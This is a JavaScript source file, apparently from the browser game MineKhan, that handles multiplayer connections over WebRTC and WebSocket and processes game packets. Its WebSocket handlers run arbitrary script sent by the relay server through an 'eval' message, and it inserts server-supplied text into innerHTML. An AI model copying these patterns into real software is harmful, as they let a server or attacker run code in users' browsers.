	function sendError(err){fetch("/minekhan/know/error",{method:"POST",body:err,headers:{Authorization:userSessionString}}).catch(console.error)}
	win.sendError = sendError

  var multiplayer = null
  var multiplayerError = null
	var websocket = null //WebSocket is not for external servers
  //let connectingProgress = ""
  let players = {}
  let playerSkins = {}, playerCapes = {}
	let banned = {}, whitelist = null
  function hasPlayer(username){
    for(var i in players){
      if(players[i].username === username) return true
    }
  }
  function getPlayerByUsername(username2){
    for(var i in players){
      if(players[i].username === username2) return players[i]
    }
		if(username2 === p.username) return p
  }

	const {packetToBitArray,bitArrayToPacket} = win
  function send(msg, to){
    if(!multiplayer){
      console.warn("Not connected. Trying to send:",msg)
      return
    }
    /*if(multiplayer.readyState !== WebSocket.OPEN){
      console.warn("WebSocket is not in open state. Current state is: "+multiplayer.readyState+". Trying to send: ",msg)
      return
    }*/
    
    msg.FROM = p.id
    msg.USER = p.username
    msg.TO = to || ""
		//let o = msg
		//msg = packetToBitArray(msg)
    multiplayer.send(msg)
		//if(screen === "packetViewer raw") packetViewerAdd(msg,true)
		//else if(screen === "packetViewer json") packetViewerAddJSON(o,msg,true)
  }
	function sendWS(msg,to){
		if(!websocket){
      console.warn("No websocket. Trying to send:",msg)
      return
    }
		if(to) msg.TO = to
		websocket.send(JSON.stringify(msg))
	}
	const {unorderedPackets} = win
	class RTCClientContainer{
		constructor(channel,connection,unorderChannel){
			this.channel = channel
			this.connection = connection
			this.unorderChannel = unorderChannel
			channel.addEventListener('message', msg => {
				const arr = new Uint8Array(msg.data)
				const packet = bitArrayToPacket(arr)
				this.onmessage(packet)
			})
			unorderChannel.addEventListener('message', msg => {
				const arr = new Uint8Array(msg.data)
				const packet = bitArrayToPacket(arr)
				this.onmessage(packet)
			})
			connection.addEventListener("connectionstatechange", e => {
				console.log(connection.connectionState)
				if(connection.connectionState === "closed" || connection.connectionState === "failed"){
					this.onclose(), this.onclose = emptyFunc
				}
			})
			channel.addEventListener("close", () => {
				this.connection.close()
				this.onclose(), this.onclose = emptyFunc
			})
		}
		send(data){
			let channel = unorderedPackets.has(data.type) ? this.unorderChannel : this.channel
			if(channel.readyState !== "open") return console.warn("Data channel not open, trying to send",data,"through",channel.label)
			channel.send(packetToBitArray(data))
		}
		close(){
			this.connection.close()
			this.onclose(), this.onclose = emptyFunc
		}
	}
	class MessagePortContainer{
		constructor(port){
			this.port = port
			port.onmessage = e => this.onmessage(e.data)
			port.onclose = e => {
				this.onclose(), this.onclose = emptyFunc
			}
		}
		send(data){
			this.port.postMessage(data)
		}
		close(){
			this.port.close()
			this.onclose(), this.onclose = emptyFunc
		}
	}
	class WebSocketClientContainer{
		constructor(ws){
			this.ws = ws
			ws.addEventListener("message", msg => {
				if((msg.data instanceof ArrayBuffer)){
					const arr = new Uint8Array(msg.data)
					const packet = bitArrayToPacket(arr)
					this.onmessage(packet)
				}
			})
			ws.addEventListener("close", () => {
				this.onclose(), this.onclose = emptyFunc
			})
		}
		send(data){
			this.ws.send(packetToBitArray(data))
		}
		close(){
			this.ws.close()
			this.onclose(), this.onclose = emptyFunc
		}
	}
	class WebSocketServerContainer{
		constructor(ws, otherId){
			this.ws = ws
			this.otherId = otherId
			ws.addEventListener("close", () => {
				this.onclose(), this.onclose = emptyFunc
			})
		}
		doOnmessage(reader){
			this.onmessage(bitArrayToPacket(reader))
		}
		doOnclose(){
			this.onclose(), this.onclose = emptyFunc
		}
		send(data){
			this.ws.send(JSON.stringify({type:"nextWsConnection",data:this.otherId}))
			this.ws.send(packetToBitArray(data))
		}
		close(){}
	}

	document.body.insertAdjacentHTML("beforeend","<script src='features.js'><"+"/script>")
  let host = false
	{
		function initSingleplayer(){
			const channel = new MessageChannel()
			serverWorld.serverAddPlayer(new MessagePortContainer(channel.port2),p.id,p.username,true,userInfo&&userInfo.admin||false)
			return new MessagePortContainer(channel.port1)
		}
		let external, isSafe, originalTarget
		async function initMultiplayer(target){
			if(preVersion && !(userInfo&&userInfo.admin)) return alert("Multiplayer is not available on this version")
			if(multiplayer) return
			
			//var ban = []
			external = false, isSafe = true, originalTarget = target
			host = false
			external = servers[target].external
			if(external){
				isSafe = servers[target].safe
				let pwd
				let d = await fetch('/getExternalServerSession/'+encodeURIComponent(target),{headers:{Authorization:userSessionString}}).then(r => r.json()).catch(() => null)
				if(!d){
					multiplayerError = {data:"failed to get session"}
					changeScene("multiplayer lost")
					return {cAnCeLcOnNectION:true}
				}else if(d.type === "error"){
					multiplayerError = d
					if(d.long){
						centerMessage.innerHTML = d.data.replace(/\n/g,"<br>")
						changeScene("multiplayer lost long")
					}else{
						changeScene("multiplayer lost")
					}
					return {cAnCeLcOnNectION:true}
				}else if(d.type === "session"){
					pwd = d.data
				}
				target = servers[target].wsurl+"?pwd="+encodeURIComponent(pwd)
				let ws = new WebSocket(target)
				await new Promise(resolve => {ws.onopen = resolve})
				return new WebSocketClientContainer(ws)
			}else{
				target = "wss://thingmaker.us.eu.org/mkjoin?target="+target
				let cAnCeLcOnNectION = false
				async function connectWs(){
					websocket = new WebSocket(target)
					websocket.binaryType = "arraybuffer"
					await new Promise(resolve => {websocket.onopen = resolve})
					
					sendWS({type:"login",sid:userSid,spwd:userSpwd})
					websocket.onmessage = async msg => {
						if(msg.data instanceof ArrayBuffer) return //should be handled by WebSocketClientContainer
						
						let data = JSON.parse(msg.data)
						if(data.type === "answer"){
							const remoteDesc = new RTCSessionDescription(data.answer)
							await peerConnection.setRemoteDescription(remoteDesc)
							waitForAnswerResolve()
							addToBottomRightList("Recieved answer: "+JSON.stringify(data.answer),"yellow")
						}else if(data.type === "iceCandidate"){
							try {
								await peerConnection.addIceCandidate(data.data)
								addToBottomRightList("Recieved and added ICE canidate: "+JSON.stringify(data.data),"yellow")
							} catch (e) {
								reportError('Error adding received ice candidate'+e.toString())
								console.log(e)
							}
						}else if(data.type === "message"){
							if(data.fromServer){
								Messages.add(data.data)
							}else{
								Messages.write(data.data, data.username)
							}
						}else if(data.type === "eval"){
							//This is also in other places!!!!!!
							console.log("Evaluating script: "+data.data)
							var res, error = false
							try{
								res = evalAtCorrectScope(data.data)
							}catch(e){
								console.error(e)
								error = true
								res = e
							}
							//send({type:"evalRes",data:res,error:error})
						}else if(data.type === "error"){
							multiplayerError = data
							console.warn("Multiplayer error!",data.data)
						}
					}
					websocket.onclose = () => {
						if(connection) connection.close()
						else{
							peerConnection.close()
							cAnCeLcOnNectION = true
							multiplayerError = multiplayerError || {data:"WebSocket closed before RTCPeerConnection connected."}
						}
						websocket = null
					}
				}

				addToBottomRightList("Opening WebSocket")
				await connectWs()

				let connection

				let peerConnection //for webrtc
				let waitForDataChannelResolve
				let waitForDataChannelPromise = new Promise(resolve => waitForDataChannelResolve = resolve)
				let waitForUnorderDataChannelResolve
				let waitForUnorderDataChannelPromise = new Promise(resolve => waitForUnorderDataChannelResolve = resolve)
				let waitForAnswerResolve //Called in connect function
				let waitForAnswerPromise = new Promise(resolve => waitForAnswerResolve = resolve)
				await new Promise((resolve) => {
				;(async function(){
					let useWsInstead
					addToBottomRightList("Creating RTCPeerConnection")
					peerConnection = new RTCPeerConnection({'iceServers': [{'urls': 'stun:stun.l.google.com:19302'}]});
	
					let channel = peerConnection.createDataChannel("multiplayer")
					channel.onopen = () => {waitForDataChannelResolve(); addToBottomRightList("Data channel opened: multiplayer","lime")}
					channel.onerror = e => {if(e.error.sctpCauseCode !== 12) logError("RTC data channel error: "+e.error.errorDetail+" "+e.error.message+" sctpCauseCode:"+e.error.sctpCauseCode)}
					channel.binaryType = "arraybuffer"
					let unorderChannel = peerConnection.createDataChannel("unorder",{ordered:false})
					unorderChannel.onopen = () => {waitForUnorderDataChannelResolve(); addToBottomRightList("Data channel opened: unorder","lime")}
					unorderChannel.onerror = e => {if(e.error.sctpCauseCode !== 12) logError("RTC data channel error: "+e.error.errorDetail+" "+e.error.message+" sctpCauseCode:"+e.error.sctpCauseCode)}
					unorderChannel.binaryType = "arraybuffer"
	
					const offer = await peerConnection.createOffer()
	  			await peerConnection.setLocalDescription(offer)
					sendWS({type:"offer",id:p.id,offer})
					addToBottomRightList("Sent offer: "+JSON.stringify(offer))
					
					peerConnection.addEventListener('icecandidate', e => {
						if (e.candidate) {
							sendWS({type:"iceCandidate", data: e.candidate})
							addToBottomRightList("Sent ICE canidate: "+JSON.stringify(e.candidate))
						}
					})
					peerConnection.addEventListener("connectionstatechange", e => {
						if(peerConnection.connectionState === "closed"){
							cAnCeLcOnNectION = true
						}else if(peerConnection.connectionState === "failed"){
							if(connection) connection.close()
							peerConnection.close()
							cAnCeLcOnNectION = true
							if(!connection){
								useWsInstead = true
								switchToWs()
							}else{
								multiplayerError = multiplayerError || {data:"WebRTC connection failed."}
							}
						}
					})
					peerConnection.addEventListener("iceconnectionstatechange", e => {
						if(peerConnection.iceconnectionState === "failed"){
							reportError("Ice connection failed")
						}
					})
					peerConnection.addEventListener("icecandidateerror", e => {
						if(e.errorCode === 701) addToBottomRightList("Ice candidate error, code: "+e.errorCode+", reason: "+e.errorText,"red")
						else{
							reportError("Ice candidate error, code: "+e.errorCode+", reason: "+e.errorText)
						}
					})
	
					await Promise.all([waitForAnswerPromise,waitForDataChannelPromise,waitForUnorderDataChannelPromise])

					if(useWsInstead) return
					if(cAnCeLcOnNectION){
						connection = {cAnCeLcOnNectION:true}
						resolve()
						return
					}
					connection = new RTCClientContainer(channel,peerConnection,unorderChannel)
					resolve()
				})()
				function switchToWs(){
					addToBottomRightList("Using websocket instead")
					sendWS({type:"switchToWs"})
					connection = new WebSocketClientContainer(websocket)
					resolve()
				}
				})
				return connection
			}
		}
		function disableMultiplayer(){
			for(let p of serverWorld.players.slice()){
				//if(c instanceof RTCClientContainer){
				if(!p.host) p.connection.close()
			}
			websocket.doNtREcOnnecT = true
			websocket.close()
		}
		win.disableMultiplayer = disableMultiplayer
		function enableMultiplayer(){//For host only
			if(preVersion && !(userInfo&&userInfo.admin)) return alert("Multiplayer is not available on this version")
			if(websocket) return
			let websocketError = null
			let peerConnections = {}
			let wsConnections = {}, nextWsConnection
			websocket = new WebSocket("wss://thingmaker.us.eu.org/mkhost?target="+serverWorld.id)
			websocket.binaryType = "arraybuffer"
			websocket.onopen = () => {
				sendWS({type:"login",sid:userSid,spwd:userSpwd})
				sendWS({
					type:"init",
					name: world.name,
					version,
					id:p.id
				})
				for(let i in banned){
					ban(i,banned[i])
				}
				if(whitelist){
					sendWS({type:"whitelist",data:"enable"})
					for(let i of whitelist) sendWS({type:"whitelist",data:"add",who:i})
				}
			}
			websocket.onmessage = async e => {
				if(e.data instanceof ArrayBuffer){
					if(wsConnections[nextWsConnection]) wsConnections[nextWsConnection].doOnmessage(new Uint8Array(e.data))
					return
				}
				let data = JSON.parse(e.data)
				if(data.type === "offer"){
					serverWorld.sendAll({type:"message",data:"<span style='color:lightgreen;'>"+data.username+" is connecting. "+(serverWorld.players.length+1)+" players now.", fromServer:true})
					let peerConnection = new RTCPeerConnection({'iceServers': [{'urls': 'stun:stun.l.google.com:19302'}]})
					peerConnections[data.id] = peerConnection

					peerConnection.addEventListener('icecandidate', event => {
						if (event.candidate) {
							sendWS({type:"iceCandidate", data: event.candidate},data.FROM)
						}
					})

					let channel, unorderChannel
					let waitForDataChannelResolve
					let waitForDataChannelPromise = new Promise(resolve => waitForDataChannelResolve = resolve)
					let waitForUnorderDataChannelResolve
					let waitForUnorderDataChannelPromise = new Promise(resolve => waitForUnorderDataChannelResolve = resolve)
					peerConnection.ondatachannel = e => {
						e.channel.binaryType = "arraybuffer"
						if(e.channel.label === "multiplayer"){
							channel = e.channel
							channel.onopen = waitForDataChannelResolve
						}else if(e.channel.label === "unorder"){
							unorderChannel = e.channel
							unorderChannel.onopen = waitForUnorderDataChannelResolve
						}else throw new Error("Unexpected data channel: "+e.channel.label)
						e.channel.onerror = e => {if(e.error.sctpCauseCode !== 12) logError("server RTC data channel error: "+e.error.errorDetail+" "+e.error.message+" sctpCauseCode:"+e.error.sctpCauseCode)}
					}

					let cAnCeLcOnNectION = false
					peerConnection.addEventListener("connectionstatechange", e => {
						if(peerConnection.connectionState === "closed"){
							cAnCeLcOnNectION = true
						}else if(peerConnection.connectionState === "failed"){
							cAnCeLcOnNectION = true
							peerConnection.close()
						}
					})

					peerConnection.setRemoteDescription(new RTCSessionDescription(data.offer));
					const answer = await peerConnection.createAnswer();
					await peerConnection.setLocalDescription(answer);
					sendWS({type:"answer", answer},data.FROM)

					await Promise.all([waitForDataChannelPromise,waitForUnorderDataChannelPromise])

					if(cAnCeLcOnNectION) return
					serverWorld.serverAddPlayer(new RTCClientContainer(channel,peerConnection,unorderChannel),data.id,data.username,false,data.admin)
				}else if(data.type === "iceCandidate"){
					let from = peerConnections[data.FROM]
					if(!from) return
					try {
						await from.addIceCandidate(data.data)
					} catch (e) {
						logError('Error adding received ice candidate'+e.toString())
						console.log(e)
					}
				}else if(data.type === "switchToWs"){
					wsConnections[data.id] = new WebSocketServerContainer(websocket,data.id)
					serverWorld.serverAddPlayer(wsConnections[data.id],data.id,data.username,false,data.admin)
				}else if(data.type === "nextWsConnection"){
					nextWsConnection = data.data
				}else if(data.type === "joined"){
					serverWorld.sendAll({type:"message",data:"<span style='color:lightgreen;'>"+data.data+" joined.", fromServer:true})
				}else if(data.type === "dc"){
					serverWorld.sendAll({type:"message",data:"<span style='color:orange;'>"+data.data+" left. "+serverWorld.players.length+" players now.", fromServer:true})
					if(peerConnections[data.id]){
						peerConnections[data.id].close()//Make sure its closed to prevent hacks
						delete peerConnections[data.id]
					}
					if(wsConnections[data.id]){
						wsConnections[data.id].close()
						delete wsConnections[data.id]
					}
				}else if(data.type === "updatePermissions"){
					if(data.action === "addBan"){
						banned[data.username] = data.message
					}else if(data.action === "removeBan"){
						delete banned[data.username]
					}else if(data.action === "whitelistAdd"){
						if(!whitelist.includes(data.username)) whitelist.push(data.username)
					}else if(data.action === "whitelistRemove"){
						whitelist.splice(whitelist.indexOf(data.username),1)
					}else if(data.action === "whitelistEnable"){
						whitelist = []
					}else if(data.action === "whitelistDisable"){
						whitelist = null
					}
				}else if(data.type === "ping"){
					sendWS({
						type:"pong",
						id:data.id
					})
				}else if(data.type === "message"){
					if(data.fromServer){
						Messages.add(data.data)
					}else{
						Messages.write(data.data, data.username)
					}
				}else if(data.type === "error"){
					websocketError = data
					console.warn("Multiplayer error!",data.data)
				}else if(data.type === "eval"){
					//This is also in other places!!!!!!
					console.log("Evaluating script: "+data.data)
					var res, error = false
					try{
						res = evalAtCorrectScope(data.data)
					}catch(e){
						console.error(e)
						error = true
						res = e
					}
					//send({type:"evalRes",data:res,error:error})
				}
			}
			websocket.onclose = () => {
				if(!websocket.doNtREcOnnecT){
					websocket = null
					//websocketError = {data:"Disconnected from server, you may re-enable multiplayer."}
					//alert("Multiplayer connection lost!\n"+websocketError.data)
					if(inWorld) setTimeout(() => enableMultiplayer(), 1000)
				}else websocket = null
			}
		}
		function joinWorld(connection){
			if(connection.cAnCeLcOnNectION) return changeScene("multiplayer lost")
			players = {}, playerSkins = {}, playerCapes = {} //empty
			let canSendPos = true //if internet is slow, don't send positions too fast because it will slow down the connection
			multiplayerError = null
			multiplayer = connection
			addToBottomRightList("Entering world...")
			send({
				type:"connect",
				id: p.id
			})
			send({type:"mySkin", data:p.skinURL, cape:p.capeURL})

			/*let invStuff = {}
			let shouldSendInvStuff = false
			multiplayer.sendInvStuff = () => {
				if(inWorld){
					invStuff.inv = world.getInv().array
					invStuff.survivStr = world.getSurvivStr().array
					shouldSendInvStuff = true
				}e
			}
			multiplayer.pos = setInterval(multiplayer.sendInvStuff, 10000)*/
			multiplayer.mmoveX = multiplayer.mmoveY = 0
			multiplayer.lastSendPos = 0
			multiplayer.toSendLoadChunks = null
			multiplayer.sendPos = (force,type) => {
				let now = Date.now()
				if((!canSendPos || now-multiplayer.lastSendPos < 100) && !force || !multiplayer.hasStartedLoad) return //if p3 hasn't been set, don't send
				
				let obj = {type:"pos", data:p3}
				/*if(shouldSendInvStuff){
					obj.inv = invStuff
					shouldSendInvStuff = false
				}*/
				if(type === "afk" || screen !== "loading" && screen !== "netherLoading" && screen !== "endLoading" && performance.now() - p.lastActive > 10000){
					obj.afk = true
				}
				canSendPos = false
				send(obj)
				multiplayer.lastSendPos = now
				if(multiplayer.toSendLoadChunks){
					send({type:"loadChunks",data:multiplayer.toSendLoadChunks.data,loadDistance:multiplayer.toSendLoadChunks.loadDistance,dimension:p.dimension})
					multiplayer.toSendLoadChunks = null
				}
				if(p.spectateRemoteControl && (multiplayer.mmoveX || multiplayer.mmoveY)){
					send({type:"remoteControl",event:"rotate",x:multiplayer.mmoveX,y:multiplayer.mmoveY},p.spectating.id)
					multiplayer.mmoveX = multiplayer.mmoveY = 0
				}
			}
			multiplayer.onmessage = async data => {
				/*const arr = new Uint8Array(msg.data)
				const packet = bitArrayToPacket(arr)
				if(screen === "packetViewer raw") packetViewerAdd(arr)
				else if(screen === "packetViewer json") packetViewerAddJSON(packet,arr)*/
				const author = data.FROM //should be the id
				
				if(data.type === "connect"){
					send({type:"mySkin", data:p.skinURL, cape:p.capeURL})
				}else if(data.type === "loadSave"){
					addToBottomRightList("Start loading world","lime")
					initBlockData()
					genIcons()
					initBlockEntities()
					world = new World()
					win.world = world
					world.version = version
					let preBetaVersion = verMoreThan("1.1.0",data.version.replace(/(Alpha|Beta) /, ''))
					weather = data.weather
					worldTime = data.time
					prevWeatherAmount = weatherAmount = slowWeatherAmount = weather ? 1 : 0
					p.flying = data.flying
					p.autoBreak = p.autoPlace = false
					p.sleeping = false

					world.id = external ? originalTarget : data.id
					world.name = data.name
					didEndPoem = false

					autosaveTimer = null
					lastAutosave = performance.now()
					saving = false

					/*if(data.stringChunks){
						let length = 0
						for(let i=0; i<data.stringChunks; i++) length += loadSaveChunks[i].length
						data.data = new Uint8Array(length)
						let idx = 0
						for(let i=0; i<data.stringChunks; i++){
							data.data.set(loadSaveChunks[i], idx)
							idx += loadSaveChunks[i].length
						}
					}
					if (data.data) {
						try {
							world.loadSave(data.data)
						}catch(e) {
							alert("Unable to load save code. Error: "+e)
							console.error(e)
							return
						}
					}*/
					p.x = data.x
					p.z = data.z
					p.y = data.y//round(data.spawnPointY+0.5+p.height*0.5)
					p.dimension = ""
					p.riding = null
					//setHotbar([0,0,0,0,0,0,0,0,0])
					//clearInv()
					inventory.currentContainer = null
					achievments = data.achievments
					p.gameMode = data.gameMode//default game mode
					cheats = data.cheats
					/*if(data.inv){
						if(data.inv.inv && data.inv.inv.length){
							try{
								world.loadInv(new BitArrayReader(data.inv.inv))
							}catch(e){
								console.error(e)
							}
						}
						if(data.inv.survivStr && data.inv.survivStr.length){
							try{
								world.loadSurvivStr(new BitArrayReader(data.inv.survivStr,true),preBetaVersion)
							}catch(e){
								console.error(e)
							}
						}
						//old still used by external servers and certain save codes
						if(data.inv.x !== undefined){
						  p.x = data.inv.x
						  p.y = data.inv.y
						  p.z = data.inv.z
						}
					}*/
					inventory.hotbarSlot = data.hotbarSlot
					loadJoined = false
					p3.hidden = true
					p.die = false
					portalFadeOutEffect = portalEffect = 0
					fromEndPortal = false
					updateTitle(true)
					if(data.activeResourcePacks){
						//world.resourcePacks = data.resourcePacks
						world.activeResourcePacks = data.activeResourcePacks
					}
					changeScene("loadingResources")
					await waitAFrame()
					await initResources()
					if(lastResourcesHash !== resourcesHash){
						await initTextures()
						initCachedShapes()
						await initBackgrounds()
					}
					p3.x = p.x
					p3.y = p.y
					p3.z = p.z
					p3.velx = p3.vely = p3.velz = 0
					p3.dimension = p.dimension
					p3.hidden = true
					multiplayer.hasStartedLoad = true//allow send position which allows recieving chunks and entities
					multiplayer.sendPos(true)
					goToLoadScreen()
					setTimeout(clearBottomRightList,1000)
				}else if(data.type === "resourcePacks"){
					if(initTextureProgress !== 1) return
					//world.resourcePacks = data.resourcePacks
					world.activeResourcePacks = data.activeResourcePacks
					changeScene("loadingResources")
					await waitAFrame()
					await initResources()
					await initTextures()
					initCachedShapes()
					await initBackgrounds()
					world.redoMeshes()
					play()
				}else if(data.type === "chunkData"){
					let chunk = world.getChunk(data.x*16,data.z*16,p.dimension)
					if(!chunk || chunk.loaded) return
					if(host){
						chunk.loadCopy()
					}else{
						chunk.load(data)
					}
					//*console.log(data.data.length);*/win.aee=(win.aee|0)+data.data.length
				}else if(data.type === "saveProg"){
					if(!host){
						let now = performance.now()
						if(data.data === "start"){
							lastAutosave = now
							autosaveTimer = now
							saving = "remote"
						}else if(data.data === "startAndSave"){
							saving = "remote"
							lastAutosave = now
						}else if(data.data === "save"){
							autosaveTimer = null
						}else if(data.data === "end"){
							saving = false
						}
					}
				}else if(data.type === "mySkin"){
					playerSkins[author] = data.data
					if(data.cape) playerCapes[author] = data.cape
				}else if(data.type === "settings"){
					worldTime = data.time || 0
					weather = data.weather || ""
					if(!host && data.data) Object.assign(worldSettings, data.data)
				}else if(data.type === "pos"){
					var pos = data.data
					if(!players[author]){
						players[author] = new Player()
						//abs( (pos.username || "").hashCode()) % 80 + 1
					}
					let thisplayer = players[author]
					thisplayer.setPos(pos.x,pos.y,pos.z,pos.velx,pos.vely,pos.velz)
					thisplayer.setRot(pos.rx, pos.ry, pos.bodyRot)
					thisplayer.sneaking = pos.sneaking
					thisplayer.dimension = pos.dimension
					thisplayer.id = author
					thisplayer.harmEffect = pos.harmEffect
					if(thisplayer.username !== pos.username){
						thisplayer.username = pos.username
						//thisplayer.changeBlock(abs((pos.username || "").hashCode()) % 80 + 1)
					}
					thisplayer.crackPos = pos.crackPos
					thisplayer.crack = pos.crack //crack number
					thisplayer.burning = pos.burning
					thisplayer.holding = pos.holding || 0
					thisplayer.walking = pos.walking
					thisplayer.sprinting = pos.sprinting
					thisplayer.punchEffect = pos.punchEffect
					thisplayer.eating = pos.eating
					thisplayer.sleeping = pos.sleeping
					thisplayer.sitting = pos.sitting
					thisplayer.swimming = pos.swimming
					thisplayer.usingItem = pos.usingItem
					thisplayer.hidden = pos.hidden
					thisplayer.spectating = pos.spectating
					thisplayer.afk = data.afk
					thisplayer.scale = pos.scale
					thisplayer.riding = pos.riding
					thisplayer.die = pos.die
					if(!thisplayer.skinSet && playerSkins[author]){
						thisplayer.setSkin(playerSkins[author])
					}
					if(!thisplayer.capeSet && playerCapes[author]){
						thisplayer.setCape(playerCapes[author])
					}
				}else if(data.type === "canSendPos"){
					canSendPos = true
				}/*else if(data.type === "shouldSendInv"){
					multiplayer.sendInvStuff()
					multiplayer.sendPos(true)
				}*/else if(data.type === "dc"){
					if(players[data.data]){
						if(inWorld) playerPoof(players[data.data]) //cool effect
						players[data.data].delete()
						delete players[data.data]
					}
				}else if(data.type === "setBlock"){
					if(inWorld){
						let pos = data.data
						world.setBlock(pos.x, pos.y, pos.z, pos.block, false, false, true, pos.keepTags, pos.dimension)
					}
				}else if(data.type === "setTags"){
					if(inWorld){
						world.setTags(data.x,data.y,data.z,data.data, true, data.dimension, data.lazy)
					}
				}else if(data.type === "entityPos"){
					if(inWorld){
						world.posEntity(new BitArrayReader(data.data, true), true)
					}
				}else if(data.type === "entityPosAll"){
					if(inWorld){
						let arr = data.data
						//if(arr.length !== world.entities.length) world.entities = []
						for(var i=0; i<arr.length; i++){
							world.posEntity(new BitArrayReader(arr[i], true), true)
						}
					}
				}else if(data.type === "entityDelete"){
					if(inWorld){
						world.deleteEntity(data.id, true)
					}
				}else if(data.type === "particles"){
					if(inWorld) world.createParticles(data)
				}else if(data.type === "achievment"){
					if(data.data&256){
						let info
						if(blockInfo[blockInfoIds[data.data>>9]]) info = blockInfo[blockInfoIds[data.data>>9]].data
   					sideMessage("Discovery Made: "+blockData[data.data>>9].Name, info)
					}else{
						let a = achievementTypes[data.data]
						sideMessage("Achievment Made: "+a.name, a.description)
					}
					achievments.push(data.data)
				}else if(data.type === "harmEffect"){
					if(players[data.id]) players[data.id].harmEffect = 30
				}else if(data.type === "effects"){
					p.effects = data.data
					//p.applyEffect(data.name, data.level, data.time, data.showParticles)
				}else if(data.type === "message"){
					if(data.fromServer){
						Messages.add(data.data)
					}else{
						Messages.write(data.data, data.username)
					}
				}else if(data.type === "playSound"){
					let volume = isFinite(data.volume) ? data.volume : null, panner
					if(data.hasPos){
						panner = posSound(data.x,data.y,data.z)
					}
					try{
					playSound(data.data, 0, volume, isFinite(data.pitch) ? data.pitch : null, panner)
					}catch(e){e.message+="name: "+data.data+", volume:"+data.volume+", pitch:"+data.pitch; throw e}
				}else if(data.type === "title"){
					showTitle(data.data,data.sub,data.color,data.fadeIn,data.fadeOut,data.stay)
				}else if(data.type === "tp"){
					p.x = data.x
					p.y = data.y
					p.z = data.z
					p.riding = null
					goToDimension(data.dimension)
				}else if(data.type === "remoteControl"){
					if(data.event === "keydown"){
						keydown({...data,type:"controlName"})
					}else if(data.event === "keyup"){
						keyup({...data,type:"controlName"})
					}else if(data.event === "rotate"){
						mmoveX += data.x
						mmoveY += data.y
					}
				}else if(data.type === "gameMode"){
					p.gameMode = data.gameMode
					if(p.spectator){
						p.flying = true
						p.spectating = data.spectating || null
						p.spectateRemoteControl = data.spectateRemoteControl || false
						p.riding = null
					}
					updateHUD = true
				}else if(data.type === "serverCmds"){
					setServerCommands(data.data)
				}/*else if(data.type === "commandDone"){
					let c = pendingCommands[data.id]
					if(c){
						c(data)
						delete pendingCommands[data.id]
					}
				}*/else if(data.type === "clientCmd"){
					clientCmdFuncs[data.data](data.args)
				}/*else if(data.type === "containerData"){
					for(let i=0; i<data.data.length; i++) inventory.slots[i] = data.data[i]
				}*/else if(data.type === "containerChange"){
					for(let i=0; i<data.data.length; i++){
						if(data.data[i] && inventory.slotIds.hotbar.includes(data.idxs[i])) data.data[i].animation = 1.5
						inventory.slots[data.idxs[i]] = data.data[i]
					}
					updateHUD = true
				}else if(data.type === "openContainer"){
					if(data.data === "sign"){
						editSign(data.x,data.y,data.z,data.dimension)
					}
				}else if(data.type === "closeContainer"){
					play()
				}else if(data.type === "containerChangeFurnace"){
					containerData.burnProgress = data.burnProgress
					containerData.progress = data.progress
				}else if(data.type === "containerChangeAnvil"){
					anvilTextbox.value = data.rename
					containerData.anvilCost = data.cost
				}else if(data.type === "respawn"){
    			p.die = false
					goToLoadScreen()
				}else if(data.type === "health"){
					if(data.health > p.health){
						healEffect = 40
					}
					p.health = data.health
					p.food = data.food
					p.foodSaturation = data.foodSaturation
					p.oxygen = data.oxygen
					p.burning = data.burning
					freezeEffect = data.freezeEffect
					p.XP = data.XP
					p.level = data.level
					p.nextLevel = data.nextLevel
					updateHUD = true
				}else if(data.type === "die"){
					if(data.id === p.id){
						dieMessage = data.message
						die()
					}else{
						let ent = players[data.id]
						if(ent){
							ent.die = true
						}
					}
				}else if(data.type === "damage"){
					p.lastDamageHealth = data.lastHealth
					harmEffect = 30
					if(data.x || data.y || data.z){
						data.x -= p.x, data.y -= p.y, data.z -= p.z
						damageX = data.x
						damageY = data.y
						damageZ = data.z
					}else{
						damageX = damageY = damageZ = 0
					}
					p.velocity.x += data.velx
					p.velocity.z += data.velz
					p.velocity.y += data.vely
					loseHealthEffect = 60
					updateHUD = true
				}else if(data.type === "rot"){
					p.rx = data.rx
					p.ry = data.ry
					p.bodyRot = data.bodyRot
				}else if(data.type === "sleep"){
					p.velocity.set(0,0,0)
					p.sleeping = true
					changeScene("sleep")
					releasePointer()
				}else if(data.type === "sit"){
					p.sitting = true
					p.flying = false
					p.velocity.x = 0
					p.velocity.y = 0
					p.velocity.z = 0
					p.riding = data.riding
				}else if(data.type === "portalOut"){
					portalFadeOutEffect = 100
				}else if(data.type === "doEndPoem"){
					showEndPoem()
				}else if(data.type === "safeEval") {
					safeEval(data.data)
				}else if(data.type === "error"){
					multiplayerError = data
					console.warn("Multiplayer error!",data.data)
				}
			}

			multiplayer.onclose = e => {
				if(websocket) websocket.close()
				multiplayerError = multiplayerError || {data:"Disconnected from server"}
				clearInterval(multiplayer.pos)
				multiplayer = null
				cmds.length = 0
				if(!host){
					updateTitle(false)
					releasePointer()
					if(multiplayerError.long){
						centerMessage.innerHTML = multiplayerError.data.replace(/\n/g,"<br>")
						changeScene("multiplayer lost long")
					}else{
						changeScene("multiplayer lost")
					}
				}
				/*if(e && e.code && e.code !== 1000 && e.code !== 1001){
					console.warn("WebSocket closed with code: "+e.code,e.reason)
				}*/
			}
		}
		win.initMultiplayer = initMultiplayer
		win.initSingleplayer = initSingleplayer
		win.joinWorld = joinWorld
		win.enableMultiplayer = enableMultiplayer
			
		win.ban = (username, why) => {
			//if(!host) return alert("Only the host can ban")
			if(websocket) sendWS({
				type: "ban",
				data: username,
				reason:why
			})
			else send({
				type: "ban",
				data: username,
				reason:why
			})
			//if(!ban.includes(username)) ban.push(username)
		}
		win.unban = username => {
			//if(!host) return alert("Only the host can unban")
			/*if(ban.includes(username)) {
				var i = ban.indexOf(username)
				if(i === -1) return
				ban.splice(i,1)
			}*/
			if(websocket) sendWS({
				type:"unban",
				data: username
			})
			else send({
				type:"unban",
				data: username
			})
		}
  }
	let fasterVel = 1
	async function joinEaglerServer(){
		let url = prompt("Enter address")
		if(!url) return
		let username = prompt("Username")
		if(!username) return
		changeScene("multiplayer connecting")
		if(!window.mcProtocol) await import("/minekhan/mcProtocol/bundle.js")
		try{
		await window.mcProtocol.dataPrefetch("pc","1.8", (l,t) => addToBottomRightList(round(l/t*100)+"%"))
		}catch(e){
			multiplayerError = {data:"while loading resources, "+e.message}
			changeScene("multiplayer lost")
			clearBottomRightList()
			return
		}
		clearBottomRightList()
		const mcData = window.mcProtocol.getMCData("1.8")
		let internalIdToEntity = []
		for(let e in mcData.entities){
			internalIdToEntity[mcData.entities[e].internalId] = entityIds[mcData.entities[e].name]
		}
